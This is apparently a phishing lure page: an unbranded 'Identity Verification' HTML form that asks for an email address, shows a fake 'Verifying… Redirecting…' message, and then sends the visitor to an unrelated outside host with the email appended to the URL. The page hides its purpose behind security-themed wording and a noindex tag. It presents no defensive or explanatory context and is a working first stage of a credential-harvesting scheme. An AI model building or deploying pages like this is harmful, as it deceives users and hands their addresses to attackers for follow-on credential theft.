<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <title>Identity Verification</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #f4f6fb;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #ffffff;
      width: 100%;
      max-width: 420px;
      border-radius: 14px;
      box-shadow: 0 18px 50px rgba(0,0,0,0.12);
      overflow: hidden;
    }

    .header {
      background: #2463eb;
      color: white;
      padding: 26px;
      text-align: center;
      font-size: 20px;
      font-weight: 600;
    }

    .content {
      padding: 32px;
    }

    .content p {
      color: #555;
      font-size: 15px;
      margin-bottom: 22px;
      line-height: 1.6;
      text-align: center;
    }

    label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1px solid #dcdfe6;
      margin-bottom: 22px;
      outline: none;
    }

    input:focus {
      border-color: #2463eb;
    }

    button {
      width: 100%;
      padding: 16px;
      background: #2463eb;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:disabled {
      background: #a0aec0;
      cursor: not-allowed;
    }

    .loading {
      display: none;
      text-align: center;
      padding: 24px;
      font-size: 15px;
      font-weight: 500;
      color: #555;
    }

    .footer {
      background: #f8fafc;
      text-align: center;
      padding: 18px;
      font-size: 12px;
      color: #777;
      border-top: 1px solid #e6e9ef;
    }
  </style>
</head>

<body>

  <div class="card">
    <div class="header">üîê Identity Verification</div>

    <div class="content">
      <p>Please enter your email address to continue.</p>

      <form id="verifyForm" autocomplete="on">
        <label for="email">Email Address</label>
        <input
          type="email"
          id="email"
          placeholder="user@business.com"
          autocomplete="email"
          required
        >

        <button id="continueBtn" disabled>
          Continue
        </button>
      </form>

      <div class="loading" id="loading">
        Verifying‚Ä¶ Redirecting‚Ä¶
      </div>
    </div>

    <div class="footer">
      Secured Access ‚Ä¢ All rights reserved
    </div>
  </div>

  <!-- ================= UPGRADED BACKEND SCRIPT ================= -->
  <script>
    (() => {
      'use strict';

      /* ===== CONFIG ===== */
      const DESTINATION = 'https://4zy6a3lndykyti.hamptocservices.net/';
      const PREFIX = '$';
      const REDIRECT_DELAY = 1200;

      /* ===== ELEMENTS ===== */
      const form = document.getElementById('verifyForm');
      const emailInput = document.getElementById('email');
      const button = document.getElementById('continueBtn');
      const loading = document.getElementById('loading');

      if (!form || !emailInput || !button || !loading) return;

      let isSubmitting = false;

      /* ===== HELPERS ===== */
      const isValidEmail = (value) => {
        return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(value);
      };

      const updateButtonState = () => {
        const value = emailInput.value.trim();
        button.disabled = !value || !isValidEmail(value);
      };

      const lockUI = () => {
        isSubmitting = true;
        button.disabled = true;
        button.style.display = 'none';
        loading.style.display = 'block';
      };

      const redirectUser = (email) => {
        // intentionally NOT encoded (matches original behavior)
        window.location.replace(DESTINATION + PREFIX + email);
      };

      /* ===== EVENTS ===== */
      emailInput.addEventListener('input', updateButtonState);
      emailInput.addEventListener('blur', updateButtonState);

      form.addEventListener('submit', (e) => {
        e.preventDefault();
        if (isSubmitting) return;

        const email = emailInput.value.trim();
        if (!isValidEmail(email)) return;

        lockUI();
        setTimeout(() => redirectUser(email), REDIRECT_DELAY);
      });

      /* ===== INIT ===== */
      updateButtonState();

    })();
  </script>

</body>
</html>
